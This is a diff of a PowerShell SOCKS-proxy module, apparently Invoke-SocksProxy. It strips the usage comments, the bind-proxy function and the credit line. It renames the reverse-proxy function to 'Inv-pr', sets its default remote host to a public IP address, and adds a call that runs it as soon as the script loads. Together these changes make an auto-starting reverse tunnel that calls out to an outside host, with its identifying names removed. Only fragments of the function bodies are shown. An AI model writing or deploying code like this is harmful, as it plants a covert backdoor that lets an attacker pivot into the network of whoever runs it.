@@ -1,21 +1,3 @@
-<#
-.
- 
-
-python ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
-
-# On the local host:
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 
-# Go through the system proxy:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy
-# Validate certificate
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'
-# Give up after a number of failed connections to the handler:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 10
-#>
- 
- 
  
 [ScriptBlock]$SocksConnectionMgr = {
     param($vars)
@@ -156,56 +138,7 @@ Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 
 }
  
 
-function Invoke-SocksProxy{
-    param (
- 
-            [String]$bindIP = "0.0.0.0",
- 
-            [Int]$bindPort = 1080,
 
-            [Int]$threads = 200
- 
-     )
-    try{
-        $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
-        $listener.start()
-        $rsp = [runspacefactory]::CreateRunspacePool(1,$threads);
-        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
-        $rsp.open();
-        write-host "Listening on port $bindPort..."
-        while($true){
-            $client = $listener.AcceptTcpClient()
-            $cliStream = $client.GetStream()
-            Write-Host "New Connection from " $client.Client.RemoteEndPoint
-            $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp; "cliStream" = $cliStream}
-            $PS3 = [PowerShell]::Create()
-            $PS3.RunspacePool = $rsp;
-            $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
-            $PS3.BeginInvoke() | Out-Null
-            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
-        }
-     }
-    catch{
-        throw $_
-    }
-    finally{
-        write-host "Server closed."
-        if ($listener -ne $null) {
-                  $listener.Stop()
-           }
-        if ($client -ne $null) {
-            $client.Dispose()
-            $client = $null
-        }
-        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
-            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
-            $PS3.Runspace.Close()
-            $PS3.Dispose()
-        }
-    }
-}
-
-# Credit to Arno0x for this technique
 function getProxyConnection{
 
     param (
@@ -236,8 +169,7 @@ function getProxyConnection{
 }
 
 
-## EXPERIMENTAL.....
-function Invoke-ReverseSocksProxy{
+function Inv-pr{
     param (
  
             [String]$remoteHost = "46.161.53.115",
@@ -350,4 +282,4 @@ function Get-IpAddress{
     return $ip2
 }
 
-Invoke-ReverseSocksProxy
+Inv-pr
